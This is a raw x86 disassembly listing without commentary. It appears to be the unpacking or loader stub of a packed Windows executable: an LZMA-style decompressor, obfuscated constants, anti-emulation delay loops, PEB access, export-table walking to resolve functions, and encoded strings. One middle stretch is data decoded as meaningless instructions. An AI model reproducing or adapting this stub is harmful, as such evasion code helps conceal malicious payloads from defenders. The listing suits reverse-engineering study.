  425613:	add    DWORD PTR [ebp-0x4],eax
  425616:	push   DWORD PTR [ebp-0x4]
  425619:	lea    esi,[ebp+0x4]
  42561c:	call   0x425a6d
  425621:	mov    eax,DWORD PTR [ebp-0x4]
  425624:	mov    eax,DWORD PTR [eax+0x1c8]
  42562a:	mov    eax,DWORD PTR [eax]
  42562c:	xor    eax,edi
  42562e:	add    eax,ebx
  425630:	mov    eax,DWORD PTR [ebp-0x4]
  425633:	jne    0x42564b
  425635:	mov    ecx,DWORD PTR [ebp-0x4]
  425638:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42563e:	push   DWORD PTR [ecx]
  425640:	mov    eax,DWORD PTR [eax+0x1e0]
  425646:	call   DWORD PTR [eax+0x28]
  425649:	jmp    0x425655
  42564b:	mov    eax,DWORD PTR [eax+0x17c]
  425651:	mov    eax,DWORD PTR [eax]
  425653:	add    DWORD PTR [esi],eax
  425655:	mov    eax,DWORD PTR [ebp-0x4]
  425658:	mov    eax,DWORD PTR [eax+0x1dc]
  42565e:	dec    DWORD PTR [eax]
  425660:	mov    ecx,DWORD PTR [ebp-0x4]
  425663:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425669:	mov    eax,DWORD PTR [eax]
  42566b:	lea    eax,[ecx+eax*4]
  42566e:	mov    ecx,DWORD PTR [ebp-0x4]
  425671:	mov    ecx,DWORD PTR [ecx+0x17c]
  425677:	mov    eax,DWORD PTR [eax]
  425679:	mov    ecx,DWORD PTR [ecx]
  42567b:	add    DWORD PTR [eax],ecx
  42567d:	pop    edi
  42567e:	pop    esi
  42567f:	pop    ebx
  425680:	leave  
  425681:	ret    0x20
  425684:	push   edi
  425685:	push   esi
  425686:	push   ebx
  425687:	push   ebp
  425688:	mov    ebp,esp
  42568a:	mov    eax,DWORD PTR [ebp+0x24]
  42568d:	add    DWORD PTR [ebp+0x28],eax
  425690:	push   eax
  425691:	cld    
  425692:	mov    esi,DWORD PTR [ebp+0x18]
  425695:	add    DWORD PTR [ebp+0x1c],esi
  425698:	push   esi
  425699:	mov    esi,DWORD PTR [ebp+0x14]
  42569c:	lods   eax,DWORD PTR ds:[esi]
  42569d:	xchg   edx,eax
  42569e:	push   edx
  42569f:	mov    cl,BYTE PTR [esi-0x2]
  4256a2:	or     eax,0xffffffff
  4256a5:	shl    eax,cl
  4256a7:	not    eax
  4256a9:	push   eax
  4256aa:	mov    cl,dh
  4256ac:	or     eax,0xffffffff
  4256af:	shl    eax,cl
  4256b1:	not    eax
  4256b3:	push   eax
  4256b4:	add    cl,dl
  4256b6:	mov    edi,esi
  4256b8:	sub    esp,0xc
  4256bb:	sub    eax,eax
  4256bd:	inc    eax
  4256be:	push   eax
  4256bf:	push   eax
  4256c0:	push   eax
  4256c1:	push   eax
  4256c2:	push   eax
  4256c3:	push   edi
  4256c4:	sub    esi,esi
  4256c6:	push   esi
  4256c7:	or     ebx,0xffffffff
  4256ca:	mov    eax,0x300
  4256cf:	shl    eax,cl
  4256d1:	lea    ecx,[eax+0x736]
  4256d7:	mov    eax,0x4000400
  4256dc:	shr    ecx,1
  4256de:	rep stos DWORD PTR es:[edi],eax
  4256e0:	push   0x5
  4256e2:	pop    ecx
  4256e3:	call   0x4259ce
  4256e8:	loop   0x4256e3
  4256ea:	lea    esi,[esi]
  4256ec:	lea    edi,[edi]
  4256ee:	mov    edi,DWORD PTR [ebp-0x4]
  4256f1:	mov    eax,DWORD PTR [ebp-0x10]
  4256f4:	sub    edi,DWORD PTR [ebp+0x24]
  4256f7:	and    eax,edi
  4256f9:	mov    DWORD PTR [ebp-0x18],eax
  4256fc:	mov    al,0x0
  4256fe:	call   0x4259e6
  425703:	jne    0x42579e
  425709:	mov    cl,BYTE PTR [ebp-0xc]
  42570c:	and    edi,DWORD PTR [ebp-0x14]
  42570f:	shl    edi,cl
  425711:	sub    cl,0x8
  425714:	neg    cl
  425716:	shr    esi,cl
  425718:	pop    eax
  425719:	add    edi,esi
  42571b:	pop    esi
  42571c:	lea    edi,[edi+edi*2]
  42571f:	shl    edi,0x8
  425722:	cmp    al,0x7
  425724:	pop    edx
  425725:	lea    ecx,[esi+edi*2+0xe6c]
  42572c:	push   ecx
  42572d:	push   esi
  42572e:	mov    esi,0x100
  425733:	push   eax
  425734:	mov    al,0x1
  425736:	jb     0x42576c
  425738:	mov    edi,DWORD PTR [ebp-0x4]
  42573b:	sub    edi,DWORD PTR [ebp-0x24]
  42573e:	movzx  edi,BYTE PTR [edi]
  425741:	mov    ebp,DWORD PTR [ebp-0x34]
  425744:	shl    edi,1
  425746:	mov    ecx,esi
  425748:	and    esi,edi
  42574a:	add    ecx,esi
  42574c:	lea    ebp,[ebp+ecx*2+0x0]
  425750:	call   0x425a05
  425755:	mov    ecx,eax
  425757:	shr    esi,0x8
  42575a:	and    ecx,0x1
  42575d:	cmp    esi,ecx
  42575f:	mov    esi,0x100
  425764:	jne    0x425774
  425766:	cmp    eax,esi
  425768:	jb     0x425741
  42576a:	jmp    0x425780
  42576c:	mov    ebp,DWORD PTR [ebp-0x34]
  42576f:	call   0x425a05
  425774:	inc    eax
  425775:	inc    esi
  425776:	sub    eax,0x1
  425779:	sub    esi,0x1
  42577c:	cmp    eax,esi
  42577e:	jb     0x42576c
  425780:	pop    edx
  425781:	inc    edx
  425782:	cmp    edx,0x5
  425785:	dec    edx
  425786:	mov    ecx,edx
  425788:	jb     0x425799
  42578a:	inc    edx
  42578b:	cmp    edx,0xb
  42578e:	dec    edx
  42578f:	mov    cl,0x4
  425791:	dec    cl
  425793:	jb     0x425799
  425795:	mov    cl,0x7
  425797:	dec    cl
  425799:	sub    edx,ecx
  42579b:	push   edx
  42579c:	jmp    0x4257ed
  42579e:	mov    al,0xc1
  4257a0:	dec    al
  4257a2:	call   0x4259f6
  4257a7:	jne    0x4257bd
  4257a9:	pop    eax
  4257aa:	pop    edi
  4257ab:	pop    edx
  4257ac:	pop    ecx
  4257ad:	pop    edx
  4257ae:	pop    ecx
  4257af:	push   DWORD PTR [esp]
  4257b2:	push   ecx
  4257b3:	push   edx
  4257b4:	mov    edx,0x664
  4257b9:	mov    cl,0x0
  4257bb:	jmp    0x425830
  4257bd:	mov    al,0xcd
  4257bf:	dec    al
  4257c1:	call   0x4259f6
  4257c6:	jne    0x4257f6
  4257c8:	mov    al,0xf1
  4257ca:	dec    al
  4257cc:	call   0x4259e6
  4257d1:	jne    0x425826
  4257d3:	pop    eax
  4257d4:	cmp    al,0x7
  4257d6:	mov    al,0x9
  4257d8:	jb     0x4257dc
  4257da:	mov    al,0xb
  4257dc:	push   eax
  4257dd:	mov    esi,DWORD PTR [ebp-0x4]
  4257e0:	sub    esi,DWORD PTR [ebp-0x24]
  4257e3:	cmp    esi,DWORD PTR [ebp+0x24]
  4257e6:	jb     0x4259bd
  4257ec:	lods   al,BYTE PTR ds:[esi]
  4257ed:	mov    edi,DWORD PTR [ebp-0x4]
  4257f0:	stos   BYTE PTR es:[edi],al
  4257f1:	jmp    0x425984
  4257f6:	mov    al,0xd8
  4257f8:	call   0x4259f6
  4257fd:	mov    esi,DWORD PTR [ebp-0x28]
  425800:	je     0x42581d
  425802:	mov    al,0xe4
  425804:	call   0x4259f6
  425809:	mov    esi,DWORD PTR [ebp-0x2c]
  42580c:	je     0x425817
  42580e:	mov    esi,DWORD PTR [ebp-0x30]
  425811:	mov    ecx,DWORD PTR [ebp-0x2c]
  425814:	mov    DWORD PTR [ebp-0x30],ecx
  425817:	mov    ecx,DWORD PTR [ebp-0x28]
  42581a:	mov    DWORD PTR [ebp-0x2c],ecx
  42581d:	mov    ecx,DWORD PTR [ebp-0x24]
  425820:	mov    DWORD PTR [ebp-0x28],ecx
  425823:	mov    DWORD PTR [ebp-0x24],esi
  425826:	pop    eax
  425827:	pop    edi
  425828:	pop    ecx
  425829:	mov    edx,0xa68
  42582e:	mov    cl,0x8
  425830:	add    edx,edi
  425832:	push   edx
  425833:	push   edi
  425834:	cmp    al,0x7
  425836:	mov    al,cl
  425838:	jb     0x42583c
  42583a:	add    al,0x3
  42583c:	push   eax
  42583d:	mov    ebp,DWORD PTR [ebp-0x34]
  425840:	call   0x425a03
  425845:	jne    0x42585b
  425847:	mov    eax,DWORD PTR [ebp-0x18]
  42584a:	mov    edi,DWORD PTR [ebp-0x34]
  42584d:	shl    eax,0x3
  425850:	sub    ecx,ecx
  425852:	push   0x8
  425854:	pop    esi
  425855:	lea    edi,[edi+eax*2+0x4]
  425859:	jmp    0x425890
  42585b:	mov    ebp,DWORD PTR [ebp-0x34]
  42585e:	add    ebp,0x2
  425861:	call   0x425a03
  425866:	jne    0x425880
  425868:	mov    eax,DWORD PTR [ebp-0x18]
  42586b:	mov    edi,DWORD PTR [ebp-0x34]
  42586e:	shl    eax,0x3
  425871:	push   0x8
  425873:	pop    ecx
  425874:	push   0x8
  425876:	pop    esi
  425877:	lea    edi,[edi+eax*2+0x104]
  42587e:	jmp    0x425890
  425880:	mov    edi,0x204
  425885:	add    edi,DWORD PTR [ebp-0x34]
  425888:	push   0x10
  42588a:	pop    ecx
  42588b:	mov    esi,0x100
  425890:	mov    DWORD PTR [ebp-0x1c],ecx
  425893:	sub    eax,eax
  425895:	inc    eax
  425896:	mov    ebp,edi
  425898:	call   0x425a05
  42589d:	mov    ecx,eax
  42589f:	sub    ecx,esi
  4258a1:	jb     0x425896
  4258a3:	add    DWORD PTR [ebp-0x1c],ecx
  4258a6:	cmp    DWORD PTR [ebp-0x3c],0x4
  4258aa:	jae    0x425960
  4258b0:	add    DWORD PTR [ebp-0x3c],0x7
  4258b4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4258b7:	cmp    ecx,0x4
  4258ba:	jb     0x4258bf
  4258bc:	push   0x3
  4258be:	pop    ecx
  4258bf:	mov    edi,DWORD PTR [ebp-0x38]
  4258c2:	shl    ecx,0x6
  4258c5:	sub    eax,eax
  4258c7:	inc    eax
  4258c8:	push   0x40
  4258ca:	pop    esi
  4258cb:	lea    edi,[edi+ecx*2+0x360]
  4258d2:	mov    ebp,edi
  4258d4:	call   0x425a05
  4258d9:	mov    ecx,eax
  4258db:	sub    ecx,esi
  4258dd:	jb     0x4258d2
  4258df:	mov    DWORD PTR [ebp-0x18],ecx
  4258e2:	mov    DWORD PTR [ebp-0x24],ecx
  4258e5:	cmp    ecx,0x4
  4258e8:	jb     0x42595d
  4258ea:	mov    esi,ecx
  4258ec:	and    DWORD PTR [ebp-0x24],0x1
  4258f0:	shr    esi,1
  4258f2:	or     DWORD PTR [ebp-0x24],0x2
  4258f6:	dec    esi
  4258f7:	cmp    ecx,0xe
  4258fa:	jae    0x425915
  4258fc:	mov    eax,0x2af
  425901:	sub    eax,ecx
  425903:	mov    ecx,esi
  425905:	shl    BYTE PTR [ebp-0x24],cl
  425908:	add    eax,DWORD PTR [ebp-0x24]
  42590b:	shl    eax,1
  42590d:	add    eax,DWORD PTR [ebp-0x38]
  425910:	mov    DWORD PTR [ebp-0x34],eax
  425913:	jmp    0x425942
  425915:	sub    esi,0x4
  425918:	call   0x4259c2
  42591d:	shr    ebx,1
  42591f:	shl    DWORD PTR [ebp-0x24],1
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jb     0x42592d
  425927:	inc    DWORD PTR [ebp-0x24]
  42592a:	sub    DWORD PTR [ebp-0x20],ebx
  42592d:	dec    esi
  42592e:	jne    0x425918
  425930:	mov    eax,0x644
  425935:	add    eax,DWORD PTR [ebp-0x38]
  425938:	mov    DWORD PTR [ebp-0x34],eax
  42593b:	shl    DWORD PTR [ebp-0x24],0x4
  42593f:	push   0x4
  425941:	pop    esi
  425942:	sub    edi,edi
  425944:	inc    edi
  425945:	mov    eax,edi
  425947:	mov    ebp,DWORD PTR [ebp-0x34]
  42594a:	call   0x425a05
  42594f:	test   al,0x1
  425951:	je     0x425956
  425953:	or     DWORD PTR [ebp-0x24],edi
  425956:	shl    edi,1
  425958:	dec    esi
  425959:	jne    0x425947
  42595b:	jmp    0x42595d
  42595d:	inc    DWORD PTR [ebp-0x24]
  425960:	mov    ecx,DWORD PTR [ebp-0x1c]
  425963:	add    ecx,0x2
  425966:	mov    edi,DWORD PTR [ebp-0x4]
  425969:	mov    eax,edi
  42596b:	sub    eax,DWORD PTR [ebp+0x24]
  42596e:	cmp    DWORD PTR [ebp-0x24],eax
  425971:	ja     0x4259bd
  425973:	mov    esi,edi
  425975:	sub    esi,DWORD PTR [ebp-0x24]
  425978:	mov    edx,DWORD PTR [ebp+0x28]
  42597b:	lods   al,BYTE PTR ds:[esi]
  42597c:	stos   BYTE PTR es:[edi],al
  42597d:	cmp    edi,edx
  42597f:	jae    0x425984
  425981:	dec    ecx
  425982:	jne    0x42597b
  425984:	mov    DWORD PTR [ebp-0x4],edi
  425987:	movzx  esi,al
  42598a:	cmp    edi,DWORD PTR [ebp+0x28]
  42598d:	jb     0x4256ee
  425993:	call   0x4259c2
  425998:	sub    eax,eax
  42599a:	lea    ebp,[esp+0x3c]
  42599e:	mov    edx,DWORD PTR [ebp+0x20]
  4259a1:	mov    esi,DWORD PTR [ebp-0x8]
  4259a4:	sub    esi,DWORD PTR [ebp+0x18]
  4259a7:	mov    DWORD PTR [edx],esi
  4259a9:	mov    edx,DWORD PTR [ebp+0x2c]
  4259ac:	mov    edi,DWORD PTR [ebp-0x4]
  4259af:	sub    edi,DWORD PTR [ebx+0x16]
  4259b2:	lods   al,BYTE PTR ds:[esi]
  4259b3:	outs   dx,BYTE PTR ds:[esi]
  4259b4:	lods   eax,DWORD PTR ds:[esi]
  4259b5:	repz inc DWORD PTR [ebx]
  4259b8:	xchg   ecx,eax
  4259b9:	test   BYTE PTR [esi-0x76cd1801],0x87
  4259c0:	xor    eax,0x86758ce9
  4259c5:	xchg   BYTE PTR [esi-0x6a75b076],al
  4259cb:	lea    edx,ds:0x5bb4dfa6
  4259d1:	imul   esi,DWORD PTR [edx+0x5b],0xb41953f6
  4259d8:	fwait
  4259d9:	or     DWORD PTR [ebp-0x53c759f7],ecx
  4259df:	fwait
  4259e0:	or     DWORD PTR [ebx+ebx*2-0x4b6a0097],ebp
  4259e7:	mov    ebx,0x8960c299
  4259ec:	lea    ecx,ds:0x299b9296
  4259f2:	xchg   edx,eax
  4259f3:	lea    esi,ds:0x8960c29e
  4259f9:	xchg   edx,eax
  4259fa:	fwait
  4259fb:	cdq    
  4259fc:	mov    ah,0x3b
  4259fe:	test   eax,0x869b37bc
  425a03:	xor    cl,BYTE PTR [ecx-0x7964c844]
  425a09:	mov    WORD PTR [ebp-0x7a],?
  425a0c:	xchg   BYTE PTR [esi-0x4b09ac76],al
  425a12:	mov    bh,0x16
  425a14:	lea    dx,[edi]
  425a17:	push   ss
  425a18:	push   es
  425a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1a:	jb     0x4259d3
  425a1c:	push   ss
  425a1d:	not    DWORD PTR [ebx-0x8]
  425a20:	mov    al,0xca
  425a22:	test   DWORD PTR [edi+0x158d6616],edx
  425a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a29:	test   al,0xd7
  425a2b:	push   ss
  425a2c:	push   es
  425a2d:	mov    ah,0xb5
  425a2f:	ret    0x55b7
  425a32:	add    cl,al
  425a34:	jmp    0xcaf16944
  425a39:	cmp    DWORD PTR [esp+0x20],ecx
  425a3d:	jae    0x425a56
  425a3f:	mov    ebx,ecx
  425a41:	mov    ecx,0x800
  425a46:	sub    ecx,edx
  425a48:	shr    ecx,0x5
  425a4b:	add    WORD PTR [ebp+0x0],cx
  425a4f:	add    eax,eax
  425a51:	lea    ebp,[esp+0x40]
  425a55:	ret    
  425a56:	shr    edx,0x5
  425a59:	sub    DWORD PTR [esp+0x20],ecx
  425a5d:	sub    ebx,ecx
  425a5f:	sub    WORD PTR [ebp+0x0],dx
  425a63:	add    eax,eax
  425a65:	add    eax,0x1
  425a68:	lea    ebp,[esp+0x40]
  425a6c:	ret    
  425a6d:	push   ebp
  425a6e:	mov    ebp,esp
  425a70:	sub    esp,0x12c
  425a76:	push   ebx
  425a77:	push   esi
  425a78:	push   edi
  425a79:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  425a80:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  425a87:	mov    eax,DWORD PTR [ebp+0x8]
  425a8a:	mov    DWORD PTR [ebp+0x8],eax
  425a8d:	mov    ecx,DWORD PTR [ebp-0x10]
  425a90:	mov    ebx,0x75108aa
  425a95:	xor    ecx,ebx
  425a97:	mov    eax,0x3272f1
  425a9c:	add    ecx,eax
  425a9e:	mov    DWORD PTR [ebp-0x24],ecx
  425aa1:	mov    ecx,DWORD PTR [ebp-0x10]
  425aa4:	xor    ecx,ebx
  425aa6:	add    ecx,eax
  425aa8:	mov    DWORD PTR [ebp-0x40],ecx
  425aab:	mov    ecx,DWORD PTR [ebp-0x10]
  425aae:	xor    ecx,ebx
  425ab0:	add    ecx,eax
  425ab2:	mov    DWORD PTR [ebp-0x3c],ecx
  425ab5:	mov    ecx,DWORD PTR [ebp-0x10]
  425ab8:	xor    ecx,ebx
  425aba:	add    ecx,eax
  425abc:	mov    DWORD PTR [ebp-0xd8],ecx
  425ac2:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  425ac9:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  425ad0:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  425ad7:	push   0x25
  425ad9:	pop    ecx
  425ada:	mov    DWORD PTR [ebp-0x30],ecx
  425add:	mov    DWORD PTR [ebp-0x30],ecx
  425ae0:	push   0x65
  425ae2:	pop    ecx
  425ae3:	mov    DWORD PTR [ebp-0x30],ecx
  425ae6:	mov    DWORD PTR [ebp-0x30],ecx
  425ae9:	mov    DWORD PTR [ebp-0x30],0x4d
  425af0:	mov    DWORD PTR [ebp-0x30],0x43
  425af7:	mov    ecx,DWORD PTR [ebp-0x10]
  425afa:	xor    ecx,ebx
  425afc:	add    ecx,eax
  425afe:	mov    DWORD PTR [ebp-0x30],ecx
  425b01:	mov    ecx,DWORD PTR [ebp-0x10]
  425b04:	xor    ecx,ebx
  425b06:	add    ecx,eax
  425b08:	mov    DWORD PTR [ebp-0x30],ecx
  425b0b:	mov    DWORD PTR [ebp-0x28],0x258
  425b12:	mov    DWORD PTR [ebp-0x34],0x36
  425b19:	mov    DWORD PTR [ebp-0x14],0x7a
  425b20:	lea    edi,[ebp-0x10c]
  425b26:	lea    esi,[ebp-0x12c]
  425b2c:	call   0x4267eb
  425b31:	dec    DWORD PTR [ebp-0x14]
  425b34:	jne    0x425b20
  425b36:	dec    DWORD PTR [ebp-0x34]
  425b39:	jne    0x425b19
  425b3b:	dec    DWORD PTR [ebp-0x28]
  425b3e:	jne    0x425b12
  425b40:	mov    DWORD PTR [ebp-0x28],0x400e
  425b47:	mov    eax,DWORD PTR [ebp-0x10]
  425b4a:	xor    eax,ebx
  425b4c:	mov    esi,0x3272f1
  425b51:	add    eax,esi
  425b53:	mov    DWORD PTR [ebp-0x1c],eax
  425b56:	mov    eax,DWORD PTR [ebp-0x10]
  425b59:	and    DWORD PTR [ebp-0x94],0x0
  425b60:	xor    eax,ebx
  425b62:	add    eax,esi
  425b64:	mov    DWORD PTR [ebp-0x38],eax
  425b67:	mov    eax,fs:0x18
  425b6d:	mov    DWORD PTR [ebp-0x94],eax
  425b73:	mov    eax,DWORD PTR [eax+0x30]
  425b76:	mov    DWORD PTR [ebp-0xcc],eax
  425b7c:	mov    eax,DWORD PTR [eax+0xc]
  425b7f:	mov    DWORD PTR [ebp-0xc0],eax
  425b85:	mov    eax,DWORD PTR [ebp+0x8]
  425b88:	lea    ecx,[ebp-0x94]
  425b8e:	mov    DWORD PTR [eax+0x1a0],ecx
  425b94:	mov    eax,DWORD PTR [ebp+0x8]
  425b97:	lea    ecx,[ebp-0xcc]
  425b9d:	mov    DWORD PTR [eax+0x1a4],ecx
  425ba3:	mov    eax,DWORD PTR [ebp+0x8]
  425ba6:	push   DWORD PTR [ebp+0x8]
  425ba9:	lea    ecx,[ebp-0xc0]
  425baf:	mov    DWORD PTR [eax+0x1a8],ecx
  425bb5:	call   0x427fac
  425bba:	mov    ecx,DWORD PTR [ebp-0x10]
  425bbd:	xor    ecx,ebx
  425bbf:	add    ecx,esi
  425bc1:	cmp    ecx,eax
  425bc3:	je     0x425f46
  425bc9:	mov    eax,DWORD PTR [ebp+0x8]
  425bcc:	mov    eax,DWORD PTR [eax+0x194]
  425bd2:	mov    ecx,DWORD PTR [eax]
  425bd4:	mov    eax,DWORD PTR [ebp+0x8]
  425bd7:	mov    eax,DWORD PTR [eax+0x194]
  425bdd:	mov    eax,DWORD PTR [eax]
  425bdf:	add    eax,DWORD PTR [ecx+0x3c]
  425be2:	mov    ecx,DWORD PTR [ebp+0x8]
  425be5:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425beb:	lea    edx,[ebp-0xec]
  425bf1:	push   edx
  425bf2:	mov    edx,DWORD PTR [ebp+0x8]
  425bf5:	mov    edx,DWORD PTR [edx+0x18c]
  425bfb:	mov    edx,DWORD PTR [edx]
  425bfd:	add    edx,DWORD PTR [eax+0x88]
  425c03:	push   0x4
  425c05:	push   DWORD PTR [eax+0x8c]
  425c0b:	push   edx
  425c0c:	call   DWORD PTR [ecx+0x1c]
  425c0f:	push   DWORD PTR [ebp+0x8]
  425c12:	xor    eax,eax
  425c14:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e34
  425c1e:	mov    DWORD PTR [ebp-0xa4],0x12370d1c
  425c28:	mov    DWORD PTR [ebp-0xa0],0x3c0d180a
  425c32:	mov    BYTE PTR [ebp-0x9c],0x83
  425c39:	lea    edi,[ebp-0x9b]
  425c3f:	stos   DWORD PTR es:[edi],eax
  425c40:	stos   WORD PTR es:[edi],ax
  425c42:	stos   BYTE PTR es:[edi],al
  425c43:	xor    eax,eax
  425c45:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e34
  425c4f:	mov    DWORD PTR [ebp-0xb8],0x12370d1c
  425c59:	mov    DWORD PTR [ebp-0xb4],0x2a0d180a
  425c63:	mov    BYTE PTR [ebp-0xb0],0x83
  425c6a:	lea    edi,[ebp-0xaf]
  425c70:	stos   DWORD PTR es:[edi],eax
  425c71:	stos   WORD PTR es:[edi],ax
  425c73:	stos   BYTE PTR es:[edi],al
  425c74:	mov    edi,DWORD PTR [ebp+0x8]
  425c77:	mov    eax,DWORD PTR [ebp+0x8]
  425c7a:	mov    edx,DWORD PTR [eax+0x1b8]
  425c80:	mov    DWORD PTR [ebp-0x68],0xd0f0e17
  425c87:	mov    DWORD PTR [ebp-0x64],0x1413101e
  425c8e:	mov    WORD PTR [ebp-0x60],0x833c
  425c94:	mov    DWORD PTR [ebp-0x90],0x1b3e0e34
  425c9e:	mov    DWORD PTR [ebp-0x8c],0x173c0d1c
  425ca8:	mov    DWORD PTR [ebp-0x88],0x311c1b13
  425cb2:	mov    DWORD PTR [ebp-0x84],0xd181008
  425cbc:	mov    DWORD PTR [ebp-0x80],0x833c1e14
  425cc3:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e34
  425cca:	mov    DWORD PTR [ebp-0x78],0x173c0d1c
  425cd1:	mov    DWORD PTR [ebp-0x74],0x311c1b13
  425cd8:	mov    DWORD PTR [ebp-0x70],0xd181008
  425cdf:	mov    DWORD PTR [ebp-0x6c],0x832a1e14
  425ce6:	call   0x427fdb
  425ceb:	push   eax
  425cec:	mov    eax,DWORD PTR [ebp+0x8]
  425cef:	mov    eax,DWORD PTR [eax+0x1a8]
  425cf5:	push   DWORD PTR [eax]
  425cf7:	call   0x427c7c
  425cfc:	test   eax,eax
  425cfe:	jne    0x425d50
  425d00:	mov    eax,DWORD PTR [ebp+0x8]
  425d03:	mov    eax,DWORD PTR [eax+0x1e0]
  425d09:	mov    edi,DWORD PTR [ebp+0x8]
  425d0c:	add    eax,0x4
  425d0f:	mov    DWORD PTR [ebp-0x20],eax
  425d12:	mov    eax,DWORD PTR [ebp+0x8]
  425d15:	mov    edx,DWORD PTR [eax+0x1b8]
  425d1b:	call   0x427fdb
  425d20:	push   eax
  425d21:	mov    eax,DWORD PTR [ebp-0x20]
  425d24:	call   DWORD PTR [eax]
  425d26:	test   eax,eax
  425d28:	jne    0x425d50
  425d2a:	mov    eax,DWORD PTR [ebp+0x8]
  425d2d:	mov    eax,DWORD PTR [eax+0x1e0]
  425d33:	mov    edi,DWORD PTR [ebp+0x8]
  425d36:	add    eax,0x10
  425d39:	mov    DWORD PTR [ebp-0x20],eax
  425d3c:	mov    eax,DWORD PTR [ebp+0x8]
  425d3f:	mov    edx,DWORD PTR [eax+0x1b8]
  425d45:	call   0x427fdb
  425d4a:	push   eax
  425d4b:	mov    eax,DWORD PTR [ebp-0x20]
  425d4e:	call   DWORD PTR [eax]
  425d50:	mov    eax,DWORD PTR [ebp-0x10]
  425d53:	mov    ecx,DWORD PTR [ebp-0x28]
  425d56:	xor    eax,ebx
  425d58:	add    eax,esi
  425d5a:	cmp    eax,ecx
  425d5c:	je     0x425f1f
  425d62:	mov    eax,DWORD PTR [ebp-0x18]
  425d65:	xor    eax,ebx
  425d67:	mov    ecx,0xffcd8d0f
  425d6c:	sub    ecx,eax
  425d6e:	add    ecx,DWORD PTR [ebp-0x28]
  425d71:	mov    eax,DWORD PTR [ebp-0x1c]
  425d74:	cmp    eax,ecx
  425d76:	ja     0x425f1f
  425d7c:	mov    DWORD PTR [ebp-0x34],0x0
  425d83:	push   DWORD PTR [ebp+0x8]
  425d86:	mov    edi,DWORD PTR [ebp+0x8]
  425d89:	mov    eax,DWORD PTR [ebp+0x8]
  425d8c:	mov    edx,DWORD PTR [eax+0x1b4]
  425d92:	call   0x427fdb
  425d97:	push   eax
  425d98:	mov    eax,DWORD PTR [ebp+0x8]
  425d9b:	mov    eax,DWORD PTR [eax+0x1a8]
  425da1:	push   DWORD PTR [eax]
  425da3:	call   0x427c7c
  425da8:	mov    ecx,DWORD PTR [ebp+0x8]
  425dab:	mov    ecx,DWORD PTR [ecx+0x19c]
  425db1:	mov    DWORD PTR [ecx],eax
  425db3:	mov    eax,DWORD PTR [ebp+0x8]
  425db6:	mov    edi,DWORD PTR [eax+0x1e0]
  425dbc:	mov    esi,DWORD PTR [ebp+0x8]
  425dbf:	xor    eax,eax
  425dc1:	lea    edx,[ebp-0x7c]
  425dc4:	call   0x428011
  425dc9:	push   eax
  425dca:	mov    eax,DWORD PTR [ebp+0x8]
  425dcd:	mov    eax,DWORD PTR [eax+0x19c]
  425dd3:	push   DWORD PTR [eax]
  425dd5:	call   DWORD PTR [edi+0x8]
  425dd8:	mov    DWORD PTR [ebp-0x20],eax
  425ddb:	mov    eax,DWORD PTR [ebp+0x8]
  425dde:	mov    edi,DWORD PTR [eax+0x1e0]
  425de4:	mov    esi,DWORD PTR [ebp+0x8]
  425de7:	xor    eax,eax
  425de9:	lea    edx,[ebp-0x90]
  425def:	call   0x428011
  425df4:	push   eax
  425df5:	mov    eax,DWORD PTR [ebp+0x8]
  425df8:	mov    eax,DWORD PTR [eax+0x19c]
  425dfe:	push   DWORD PTR [eax]
  425e00:	call   DWORD PTR [edi+0x8]
  425e03:	mov    eax,DWORD PTR [ebp+0x8]
  425e06:	mov    edi,DWORD PTR [eax+0x1e0]
  425e0c:	mov    esi,DWORD PTR [ebp+0x8]
  425e0f:	xor    eax,eax
  425e11:	lea    edx,[ebp-0xa8]
  425e17:	call   0x428011
  425e1c:	push   eax
  425e1d:	mov    eax,DWORD PTR [ebp+0x8]
  425e20:	mov    eax,DWORD PTR [eax+0x19c]
  425e26:	push   DWORD PTR [eax]
  425e28:	call   DWORD PTR [edi+0x8]
  425e2b:	and    DWORD PTR [ebp-0x8],0x0
  425e2f:	mov    DWORD PTR [ebp-0x48],eax
  425e32:	mov    eax,DWORD PTR [ebp-0x8]
  425e35:	and    eax,0x7
  425e38:	add    eax,0x31
  425e3b:	push   eax
  425e3c:	call   DWORD PTR [ebp-0x20]
  425e3f:	test   eax,eax
  425e41:	je     0x425e85
  425e43:	mov    eax,DWORD PTR [ebp-0x8]
  425e46:	push   0x19
  425e48:	xor    edx,edx
  425e4a:	pop    ecx
  425e4b:	div    ecx
  425e4d:	add    dl,0x41
  425e50:	movzx  eax,dl
  425e53:	push   eax
  425e54:	call   DWORD PTR [ebp-0x48]
  425e57:	test   eax,eax
  425e59:	jne    0x425e85
  425e5b:	mov    eax,DWORD PTR [ebp+0x8]
  425e5e:	mov    edi,DWORD PTR [eax+0x1e0]
  425e64:	mov    esi,DWORD PTR [ebp+0x8]
  425e67:	xor    eax,eax
  425e69:	lea    edx,[ebp-0x68]
  425e6c:	call   0x428011
  425e71:	push   eax
  425e72:	mov    eax,DWORD PTR [ebp+0x8]
  425e75:	mov    eax,DWORD PTR [eax+0x198]
  425e7b:	push   DWORD PTR [eax]
  425e7d:	call   DWORD PTR [edi+0x8]
  425e80:	mov    DWORD PTR [ebp-0x14],eax
  425e83:	jmp    0x425e89
  425e85:	and    DWORD PTR [ebp-0x14],0x0
  425e89:	inc    DWORD PTR [ebp-0x8]
  425e8c:	cmp    DWORD PTR [ebp-0x8],0x10
  425e90:	jb     0x425e32
  425e92:	mov    eax,DWORD PTR [ebp-0x18]
  425e95:	mov    esi,DWORD PTR [ebp+0x8]
  425e98:	xor    eax,ebx
  425e9a:	mov    edi,0x3272f1
  425e9f:	add    eax,edi
  425ea1:	lea    edx,[ebp-0x10c]
  425ea7:	call   0x428011
  425eac:	push   eax
  425ead:	mov    eax,DWORD PTR [ebp-0x10]
  425eb0:	mov    esi,DWORD PTR [ebp+0x8]
  425eb3:	xor    eax,ebx
  425eb5:	add    eax,edi
